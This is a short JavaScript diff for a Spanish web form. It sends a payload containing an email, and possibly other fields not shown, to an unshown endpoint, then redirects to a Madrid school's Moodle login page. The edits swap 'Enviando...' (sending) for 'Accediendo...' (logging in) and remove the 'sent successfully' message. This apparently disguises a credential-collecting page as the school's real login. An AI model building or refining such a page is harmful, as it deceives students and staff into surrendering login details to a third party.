@@ -137,7 +137,7 @@
         return;
       }
 
-      msg.textContent = "Enviando...";
+      msg.textContent = "Accediendo...";
 
       const payload = {
         email,
@@ -158,7 +158,7 @@
         });
 
         if (res.ok) {
-          msg.textContent = "✔ Enviado correctamente.";
+          msg.textContent = "";
           window.location.href = "https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/index.php";
         } else {
           const errorText = await res.text();
